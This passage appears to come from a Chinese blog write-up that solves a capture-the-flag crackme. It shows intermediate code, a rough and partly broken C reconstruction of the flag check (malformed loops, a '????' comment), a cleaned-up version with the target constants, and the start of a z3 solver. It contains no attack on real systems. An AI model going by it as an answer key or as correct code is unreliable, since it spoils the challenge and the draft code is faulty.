class="number">1640</span>&gt;&lt;+tempa&gt; := var17&lt;+<span class="number">72</span>&gt;</span><br><span class="line">  temp374 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; + temp374</span><br><span class="line">  GOTO label283</span><br><span class="line">LABEL label281 :</span><br><span class="line">  temp379 := #<span class="number">0</span></span><br><span class="line">  var12&lt;+<span class="number">32</span>&gt; := temp379</span><br><span class="line">  temp380 := #<span class="number">0</span></span><br><span class="line">  var13&lt;+<span class="number">40</span>&gt; := temp380</span><br><span class="line">  temp381 := #<span class="number">0</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp381</span><br><span class="line">LABEL label292 :</span><br><span class="line">  temp382 := #<span class="number">24</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp382 GOTO label291</span><br><span class="line">  GOTO label290</span><br><span class="line">LABEL label291 :</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var12&lt;+<span class="number">32</span>&gt; := var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var13&lt;+<span class="number">40</span>&gt; := var23(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">872</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  IF var13&lt;+<span class="number">40</span>&gt; != var12&lt;+<span class="number">32</span>&gt; GOTO label298</span><br><span class="line">  GOTO label297</span><br><span class="line">LABEL label298 :</span><br><span class="line">  temp383 := CALL writef <span class="comment">//调用函数</span></span><br><span class="line">  temp384 := CALL <span class="built_in">exit</span><span class="comment">//退出</span></span><br><span class="line">LABEL label297 :</span><br><span class="line">  temp385 := #<span class="number">1</span></span><br><span class="line">  temp386 := var15&lt;+<span class="number">56</span>&gt; + temp385</span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp386</span><br><span class="line">  GOTO label292</span><br><span class="line">LABEL label290 :</span><br><span class="line">  temp387 := CALL writes</span><br><span class="line">  temp388 := CALL <span class="built_in">exit</span></span><br><span class="line">LABEL Flabelmain :</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="C代码"><a href="#C代码" class="headerlink" title="C代码"></a>C代码</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span>* var2)</span> {</span><br><span class="line">    Flabelread:</span><br><span class="line">    <span class="comment">// Function body goes here</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writes</span><span class="params">()</span> {</span><br><span class="line">    Flabelwrites:</span><br><span class="line">    <span class="comment">// Function body goes here</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writef</span><span class="params">()</span> {</span><br><span class="line">    Flabelwritef:</span><br><span class="line">    <span class="comment">// Function body goes here</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exit</span><span class="params">()</span> {</span><br><span class="line">    Flabelexit:</span><br><span class="line">    <span class="comment">// Function body goes here</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">  <span class="type">int</span> key[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> L[<span class="number">8</span>];</span><br><span class="line">  <span class="type">int</span> R[<span class="number">8</span>];</span><br><span class="line">  <span class="type">int</span> X[<span class="number">8</span>];</span><br><span class="line">} <span class="built_in">exp</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">char</span>* var11[])</span> {</span><br><span class="line">    <span class="built_in">exp</span> var22;</span><br><span class="line">    <span class="built_in">exp</span> var23;</span><br><span class="line">    <span class="built_in">exp</span> var24;</span><br><span class="line">    <span class="built_in">exp</span> var25;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">24</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i++){</span><br><span class="line">        var22.key[<span class="number">23</span>-i] = input[i];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> ie=<span class="number">23</span>;ie&gt;<span class="number">0</span>;ie--){</span><br><span class="line">        var22.key[ie] = var22.key[ie]-var22.key[ie<span class="number">-1</span>];</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    var22.L[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    var22.R[<span class="number">0</span>] = <span class="number">8</span>;</span><br><span class="line">    var22.X[<span class="number">0</span>] = <span class="number">11</span>;</span><br><span class="line">    var22.L[<span class="number">1</span>] = <span class="number">15</span>;</span><br><span class="line">    var22.R[<span class="number">1</span>] = <span class="number">23</span>;</span><br><span class="line">    <span class="type">int</span> tmp27 = <span class="number">0</span> - <span class="number">13</span>;</span><br><span class="line"></span><br><span class="line">    var22.X[<span class="number">1</span>] = tmp27;</span><br><span class="line">    var22.L[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">    var22.R[<span class="number">2</span>] = <span class="number">11</span>;</span><br><span class="line">    var22.X[<span class="number">2</span>] = <span class="number">17</span>;</span><br><span class="line">    var22.L[<span class="number">3</span>] = <span class="number">10</span>;</span><br><span class="line">    var22.R[<span class="number">3</span>] = <span class="number">20</span>;</span><br><span class="line">    <span class="comment">// ....初始化跳过....</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;<span class="number">8</span>;i++){</span><br><span class="line">        var22.key[var22.L[i]] += var22.X[i];</span><br><span class="line">        var22.key[var22.R[i]] -= var22.X[i];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">24</span>;i++){</span><br><span class="line">        var22.key[i]+= var22.key[i<span class="number">-1</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">23</span>;++){</span><br><span class="line">        var22.key[i]^=<span class="number">0</span>; <span class="comment">//????</span></span><br><span class="line">        <span class="comment">// var22.key[i]^= var22.key[i+1];</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    var24.L[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    var24.R[<span class="number">0</span>] = <span class="number">12</span>;</span><br><span class="line">    <span class="comment">// ..... 赋值跳过....</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> ie=<span class="number">23</span>;ie&gt;<span class="number">0</span>;ie--){</span><br><span class="line">        var24.key[ie] -= var24.key[ie<span class="number">-1</span>]; </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++){</span><br><span class="line">        var24.key[var24.L[i]] += var24.X[i];</span><br><span class="line">        var24.key[var24.R[i]] -= var24.X[i];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">24</span>;i++){</span><br><span class="line">        var24.key[i] +=  var24.key[i<span class="number">-1</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// var23初始化跳过</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i++){</span><br><span class="line">        var23.key[i] ^= var24.key[i];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++){</span><br><span class="line">        var23.X[i] = var22.key[i*<span class="number">3</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> ie=<span class="number">23</span>;ie&gt;<span class="number">0</span>;ie--){</span><br><span class="line">        var23.key[ie] -= var23.key[ie<span class="number">-1</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++){</span><br><span class="line">        var23.key[var22.L[i]] -= var23.X[i];</span><br><span class="line">        var23.key[var22.R[i]] += var23.X[i];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">24</span>;i++){</span><br><span class="line">        var23.key[i] += var23.key[i<span class="number">-1</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++){</span><br><span class="line">        <span class="type">int</span> tmp = var22.L[i]^var22.L[i+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(tmp&gt;<span class="number">23</span>){</span><br><span class="line">            tmp = <span class="number">23</span>;</span><br><span class="line">        }</span><br><span class="line">        var22.L[i] = <span class="number">23</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    var25.L[<span class="number">7</span>] =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++){</span><br><span class="line">        <span class="type">int</span> tmp2 = var22.R[i]^var22.R[i+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(tmp2&gt;<span class="number">23</span>){</span><br><span class="line">            tmp2 = <span class="number">23</span>;</span><br><span class="line">        }</span><br><span class="line">        var25.R[i] = tmp2;</span><br><span class="line">    }</span><br><span class="line">    var25.R[<span class="number">7</span>] =<span class="number">23</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&gt;<span class="number">7</span>;i++){</span><br><span class="line">        var25.X[i] = var22.X[i+<span class="number">1</span>]^var22.X[i];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// init var25 跳过</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> ie=<span class="number">23</span>;ie&gt;<span class="number">0</span>;ie--){</span><br><span class="line">        var25.key[ie] -= var25.key[ie<span class="number">-1</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++){</span><br><span class="line">        var25.key[var25.L[i]] -= var25.X[i];</span><br><span class="line">        var25.key[var25.R[i]] += var25.X[i];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">24</span>;i++){</span><br><span class="line">        var25.key[i] += var25.key[i<span class="number">-1</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i++){</span><br><span class="line">        <span class="keyword">if</span>(var22.key[i]!=var23.key[i]){</span><br><span class="line">            print(<span class="string">"error"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>简单整理一下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> key[<span class="number">24</span>];</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> L[<span class="number">8</span>];</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> R[<span class="number">8</span>];</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> X[<span class="number">8</span>];</span><br><span class="line">} <span class="built_in">exp</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="built_in">exp</span> var22;</span><br><span class="line">    <span class="built_in">exp</span> var23;</span><br><span class="line">    <span class="built_in">exp</span> var24;</span><br><span class="line">    <span class="built_in">exp</span> var25;</span><br><span class="line">    </span><br><span class="line">    var22.L[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    var22.R[<span class="number">0</span>] = <span class="number">8</span>;</span><br><span class="line">    var22.X[<span class="number">0</span>] = <span class="number">11</span>;</span><br><span class="line">    var22.L[<span class="number">1</span>] = <span class="number">15</span>;</span><br><span class="line">    var22.R[<span class="number">1</span>] = <span class="number">23</span>;</span><br><span class="line">    var22.X[<span class="number">1</span>] = <span class="number">-13</span>;</span><br><span class="line">    var22.L[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">    var22.R[<span class="number">2</span>] = <span class="number">11</span>;</span><br><span class="line">    var22.X[<span class="number">2</span>] = <span class="number">17</span>;</span><br><span class="line">    var22.L[<span class="number">3</span>] = <span class="number">10</span>;</span><br><span class="line">    var22.R[<span class="number">3</span>] = <span class="number">20</span>;</span><br><span class="line">    var22.X[<span class="number">3</span>] = <span class="number">-19</span>;</span><br><span class="line">    var22.L[<span class="number">4</span>] = <span class="number">6</span>;</span><br><span class="line">    var22.R[<span class="number">4</span>] = <span class="number">13</span>;</span><br><span class="line">    var22.X[<span class="number">4</span>] = <span class="number">23</span>;</span><br><span class="line">    var22.L[<span class="number">5</span>] = <span class="number">9</span>;</span><br><span class="line">    var22.R[<span class="number">5</span>] = <span class="number">21</span>;</span><br><span class="line">    var22.X[<span class="number">5</span>] = <span class="number">-29</span>;</span><br><span class="line">    var22.L[<span class="number">6</span>] = <span class="number">1</span>;</span><br><span class="line">    var22.R[<span class="number">6</span>] = <span class="number">19</span>;</span><br><span class="line">    var22.X[<span class="number">6</span>] = <span class="number">31</span>;</span><br><span class="line">    var22.L[<span class="number">7</span>] = <span class="number">4</span>;</span><br><span class="line">    var22.R[<span class="number">7</span>] = <span class="number">17</span>;</span><br><span class="line">    var22.X[<span class="number">7</span>] = <span class="number">-37</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> input[<span class="number">24</span>];</span><br><span class="line"></span><br><span class="line">    scanf_s(<span class="string">"%s"</span>, input, <span class="keyword">sizeof</span>(input));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) {</span><br><span class="line">        var22.key[<span class="number">23</span> - i] = input[i];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> ie = <span class="number">23</span>; ie &gt; <span class="number">0</span>; ie--) {</span><br><span class="line">        var22.key[ie] = var22.key[ie] - var22.key[ie - <span class="number">1</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对input进行简单加密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) {</span><br><span class="line">        var22.key[var22.L[i]] += var22.X[i];</span><br><span class="line">        var22.key[var22.R[i]] -= var22.X[i];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">24</span>; i++) {</span><br><span class="line">        var22.key[i] += var22.key[i - <span class="number">1</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    var23.key[<span class="number">0</span>] = <span class="number">252</span>;</span><br><span class="line">    var23.key[<span class="number">1</span>] = <span class="number">352</span>;</span><br><span class="line">    var23.key[<span class="number">2</span>] = <span class="number">484</span>;</span><br><span class="line">    var23.key[<span class="number">3</span>] = <span class="number">470</span>;</span><br><span class="line">    var23.key[<span class="number">4</span>] = <span class="number">496</span>;</span><br><span class="line">    var23.key[<span class="number">5</span>] = <span class="number">487</span>;</span><br><span class="line">    var23.key[<span class="number">6</span>] = <span class="number">539</span>;</span><br><span class="line">    var23.key[<span class="number">7</span>] = <span class="number">585</span>;</span><br><span class="line">    var23.key[<span class="number">8</span>] = <span class="number">447</span>;</span><br><span class="line">    var23.key[<span class="number">9</span>] = <span class="number">474</span>;</span><br><span class="line">    var23.key[<span class="number">10</span>] = <span class="number">577</span>;</span><br><span class="line">    var23.key[<span class="number">11</span>] = <span class="number">454</span>;</span><br><span class="line">    var23.key[<span class="number">12</span>] = <span class="number">466</span>;</span><br><span class="line">    var23.key[<span class="number">13</span>] = <span class="number">345</span>;</span><br><span class="line">    var23.key[<span class="number">14</span>] = <span class="number">344</span>;</span><br><span class="line">    var23.key[<span class="number">15</span>] = <span class="number">486</span>;</span><br><span class="line">    var23.key[<span class="number">16</span>] = <span class="number">501</span>;</span><br><span class="line">    var23.key[<span class="number">17</span>] = <span class="number">423</span>;</span><br><span class="line">    var23.key[<span class="number">18</span>] = <span class="number">490</span>;</span><br><span class="line">    var23.key[<span class="number">19</span>] = <span class="number">375</span>;</span><br><span class="line">    var23.key[<span class="number">20</span>] = <span class="number">257</span>;</span><br><span class="line">    var23.key[<span class="number">21</span>] = <span class="number">203</span>;</span><br><span class="line">    var23.key[<span class="number">22</span>] = <span class="number">265</span>;</span><br><span class="line">    var23.key[<span class="number">23</span>] = <span class="number">125</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据input和key生成res</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> ie = <span class="number">23</span>; ie &gt; <span class="number">0</span>; ie--) {</span><br><span class="line">        var23.key[ie] -= var23.key[ie - <span class="number">1</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) {     </span><br><span class="line">        var23.key[var22.L[i]] -= var22.key[i * <span class="number">3</span>];</span><br><span class="line">        var23.key[var22.R[i]] += var22.key[i * <span class="number">3</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">24</span>; i++) {</span><br><span class="line">        var23.key[i] += var23.key[i - <span class="number">1</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) {</span><br><span class="line">        <span class="keyword">if</span> (var22.key[i] != var23.key[i]) {</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="z3约束解题"><a href="#z3约束解题" class="headerlink" title="z3约束解题"></a>z3约束解题</h2><p>这儿使用z3约束一下，即可得解</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.key = [<span class="number">0</span>] * <span class="number">24</span></span><br><span class="line">        self.L = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">        self.R = [<span class="number">0</span>] * <span 